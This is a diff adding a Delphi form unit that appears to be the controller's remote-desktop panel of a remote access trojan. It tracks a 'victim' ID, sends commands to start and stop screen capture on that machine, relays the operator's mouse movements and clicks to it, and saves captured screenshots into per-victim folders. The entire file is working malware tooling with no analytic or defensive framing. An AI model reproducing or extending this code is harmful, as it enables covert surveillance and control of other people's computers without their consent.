@@ -1,0 +1,317 @@
+unit FrmRemoteDesktop;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.StdCtrls,
+  Vcl.ComCtrls, Vcl.Samples.Spin;
+
+type
+  TForm9 = class(TForm)
+    Image1: TImage;
+    GroupBox1: TGroupBox;
+    CheckBox1: TCheckBox;
+    CheckBox2: TCheckBox;
+    CheckBox3: TCheckBox;
+    GroupBox2: TGroupBox;
+    CheckBox4: TCheckBox;
+    CheckBox5: TCheckBox;
+    GroupBox3: TGroupBox;
+    SpinEdit1: TSpinEdit;
+    GroupBox4: TGroupBox;
+    ComboBox1: TComboBox;
+    TrackBar1: TTrackBar;
+    StatusBar1: TStatusBar;
+    Button1: TButton;
+    Button2: TButton;
+    procedure Button1Click(Sender: TObject);
+    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState;
+      X, Y: Integer);
+    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
+      Shift: TShiftState; X, Y: Integer);
+    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
+      Shift: TShiftState; X, Y: Integer);
+    procedure Button2Click(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    FullScreenshotBitmap: TBitmap;
+    ThisFormsVictimID: string;
+  end;
+
+var
+  Form9: TForm9;
+
+implementation
+
+{$R *.dfm}
+
+uses FrmMain;
+
+procedure SendToSelectedClient(const VictimID, Msg: string);
+var
+  I: Integer;
+  NickName: string;
+  UserData: TConnectedUserData;
+begin
+  NickName := VictimID;
+  for I := 0 to Form1.ConnectedUsers.Count - 1 do
+  begin
+    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
+    if UserData.ID = NickName then
+    begin
+      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
+      Exit;
+    end;
+  end;
+end;
+
+procedure TForm9.Button1Click(Sender: TObject);
+begin
+  if self.Button1.Caption = 'Start' then
+  begin
+    SendToSelectedClient(self.ThisFormsVictimID, 'ScreenSize|');
+    SendToSelectedClient(self.ThisFormsVictimID, 'StartScreenCapture|');
+    StatusBar1.Panels[0].Text := 'Status: Started';
+    self.Button1.Caption := 'Stop';
+  end
+  else
+  begin
+    SendToSelectedClient(self.ThisFormsVictimID, 'StopScreenCapture|');
+    StatusBar1.Panels[0].Text := 'Status: Stopped';
+    self.Button1.Caption := 'Start';
+  end;
+end;
+
+procedure TForm9.Button2Click(Sender: TObject);
+var
+  screenshotDir, victimDir, fileName: string;
+  currentDateTime: string;
+begin
+  if ThisFormsVictimID = '' then
+  begin
+    Exit;
+  end;
+  screenshotDir := ExtractFilePath(ParamStr(0)) + 'screenshots';
+  victimDir := screenshotDir + '\' + ThisFormsVictimID;
+  currentDateTime := FormatDateTime('yyyy-mm-dd_hh-nn-ss', Now);
+  fileName := victimDir + '\screenshot-' + currentDateTime + '.jpg';
+  if not DirectoryExists(screenshotDir) then
+    CreateDir(screenshotDir);
+  if not DirectoryExists(victimDir) then
+    CreateDir(victimDir);
+
+  // Save the image if it is not empty
+  if not Image1.Picture.Graphic.Empty then
+    Image1.Picture.SaveToFile(fileName)
+  else
+end;
+
+procedure TForm9.Image1MouseDown(Sender: TObject; Button: TMouseButton;
+  Shift: TShiftState; X, Y: Integer);
+const
+  DefaultScreenWidth = 1920;
+  DefaultScreenHeight = 1080;
+var
+  ImageWidth, ImageHeight: Integer;
+  ScreenX, ScreenY: Integer;
+  RatioX, RatioY: Double;
+  ScreenWidth, ScreenHeight: Integer;
+  ResolutionStr, WidthStr, HeightStr: string;
+  XPos: Integer;
+  CommandStr: string;
+begin
+  if not (CheckBox2.Checked and (Button1.Caption = 'Stop')) then
+    Exit;
+
+  // Extract and parse resolution from StatusBar1
+  ResolutionStr := StatusBar1.Panels[1].Text;
+  XPos := Pos(':', ResolutionStr);
+  if XPos > 0 then
+  begin
+    Delete(ResolutionStr, 1, XPos + 1);
+    XPos := Pos('x', ResolutionStr);
+
+    if XPos > 0 then
+    begin
+      WidthStr := Copy(ResolutionStr, 1, XPos - 1);
+      HeightStr := Copy(ResolutionStr, XPos + 1, MaxInt);
+
+      ScreenWidth := StrToIntDef(Trim(WidthStr), DefaultScreenWidth);
+      ScreenHeight := StrToIntDef(Trim(HeightStr), DefaultScreenHeight);
+    end
+    else
+    begin
+      ScreenWidth := DefaultScreenWidth;
+      ScreenHeight := DefaultScreenHeight;
+    end;
+  end
+  else
+  begin
+    ScreenWidth := DefaultScreenWidth;
+    ScreenHeight := DefaultScreenHeight;
+  end;
+
+  // Get image dimensions
+  ImageWidth := Image1.Width;
+  ImageHeight := Image1.Height;
+
+  if (ImageWidth > 0) and (ImageHeight > 0) then
+  begin
+    // Calculate ratios and scaled mouse positions
+    RatioX := ScreenWidth / ImageWidth;
+    RatioY := ScreenHeight / ImageHeight;
+
+    ScreenX := Round(X * RatioX);
+    ScreenY := Round(Y * RatioY);
+
+    // Determine the command based on which mouse button was clicked
+    case Button of
+      mbLeft: CommandStr := 'MouseDownLeft';
+      mbRight: CommandStr := 'MouseDownRight';
+    else
+      Exit; // Exit if it's neither left nor right mouse button
+    end;
+
+    // Send mouse position to the selected client
+    SendToSelectedClient(Self.ThisFormsVictimID, Format('%s|%d|%d', [CommandStr, ScreenX, ScreenY]));
+  end;
+end;
+
+procedure TForm9.Image1MouseMove(Sender: TObject; Shift: TShiftState;
+  X, Y: Integer);
+const
+  DefaultScreenWidth = 1920;
+  DefaultScreenHeight = 1080;
+var
+  ImageWidth, ImageHeight: Integer;
+  ScreenX, ScreenY: Integer;
+  RatioX, RatioY: Double;
+  ScreenWidth, ScreenHeight: Integer;
+  ResolutionStr, WidthStr, HeightStr: string;
+  XPos: Integer;
+begin
+  if not(CheckBox3.Checked and (Button1.Caption = 'Stop')) then
+    Exit;
+
+  // Extract and parse resolution from StatusBar1
+  ResolutionStr := StatusBar1.Panels[1].Text;
+  XPos := Pos(':', ResolutionStr);
+  if XPos > 0 then
+  begin
+    Delete(ResolutionStr, 1, XPos + 1);
+    XPos := Pos('x', ResolutionStr);
+
+    if XPos > 0 then
+    begin
+      WidthStr := Copy(ResolutionStr, 1, XPos - 1);
+      HeightStr := Copy(ResolutionStr, XPos + 1, MaxInt);
+
+      ScreenWidth := StrToIntDef(Trim(WidthStr), DefaultScreenWidth);
+      ScreenHeight := StrToIntDef(Trim(HeightStr), DefaultScreenHeight);
+    end
+    else
+    begin
+      ScreenWidth := DefaultScreenWidth;
+      ScreenHeight := DefaultScreenHeight;
+    end;
+  end
+  else
+  begin
+    ScreenWidth := DefaultScreenWidth;
+    ScreenHeight := DefaultScreenHeight;
+  end;
+
+  // Get image dimensions
+  ImageWidth := Image1.Width;
+  ImageHeight := Image1.Height;
+
+  if (ImageWidth > 0) and (ImageHeight > 0) then
+  begin
+    // Calculate ratios and scaled mouse positions
+    RatioX := ScreenWidth / ImageWidth;
+    RatioY := ScreenHeight / ImageHeight;
+
+    ScreenX := Round(X * RatioX);
+    ScreenY := Round(Y * RatioY);
+
+    // Send mouse position to the selected client
+    SendToSelectedClient(self.ThisFormsVictimID, Format('MousePos|%d|%d',
+      [ScreenX, ScreenY]));
+  end;
+end;
+
+procedure TForm9.Image1MouseUp(Sender: TObject; Button: TMouseButton;
+  Shift: TShiftState; X, Y: Integer);
+const
+  DefaultScreenWidth = 1920;
+  DefaultScreenHeight = 1080;
+var
+  ImageWidth, ImageHeight: Integer;
+  ScreenX, ScreenY: Integer;
+  RatioX, RatioY: Double;
+  ScreenWidth, ScreenHeight: Integer;
+  ResolutionStr, WidthStr, HeightStr: string;
+  XPos: Integer;
+  CommandStr: string;
+begin
+  if not (CheckBox2.Checked and (Button1.Caption = 'Stop')) then
+    Exit;
+
+  // Extract and parse resolution from StatusBar1
+  ResolutionStr := StatusBar1.Panels[1].Text;
+  XPos := Pos(':', ResolutionStr);
+  if XPos > 0 then
+  begin
+    Delete(ResolutionStr, 1, XPos + 1);
+    XPos := Pos('x', ResolutionStr);
+
+    if XPos > 0 then
+    begin
+      WidthStr := Copy(ResolutionStr, 1, XPos - 1);
+      HeightStr := Copy(ResolutionStr, XPos + 1, MaxInt);
+
+      ScreenWidth := StrToIntDef(Trim(WidthStr), DefaultScreenWidth);
+      ScreenHeight := StrToIntDef(Trim(HeightStr), DefaultScreenHeight);
+    end
+    else
+    begin
+      ScreenWidth := DefaultScreenWidth;
+      ScreenHeight := DefaultScreenHeight;
+    end;
+  end
+  else
+  begin
+    ScreenWidth := DefaultScreenWidth;
+    ScreenHeight := DefaultScreenHeight;
+  end;
+
+  // Get image dimensions
+  ImageWidth := Image1.Width;
+  ImageHeight := Image1.Height;
+
+  if (ImageWidth > 0) and (ImageHeight > 0) then
+  begin
+    // Calculate ratios and scaled mouse positions
+    RatioX := ScreenWidth / ImageWidth;
+    RatioY := ScreenHeight / ImageHeight;
+
+    ScreenX := Round(X * RatioX);
+    ScreenY := Round(Y * RatioY);
+
+    // Determine the command based on which mouse button was clicked
+    case Button of
+      mbLeft: CommandStr := 'MouseUpLeft';
+      mbRight: CommandStr := 'MouseUpRight';
+    else
+      Exit; // Exit if it's neither left nor right mouse button
+    end;
+
+    // Send mouse position to the selected client
+    SendToSelectedClient(Self.ThisFormsVictimID, Format('%s|%d|%d', [CommandStr, ScreenX, ScreenY]));
+  end;
+end;
+
+end.
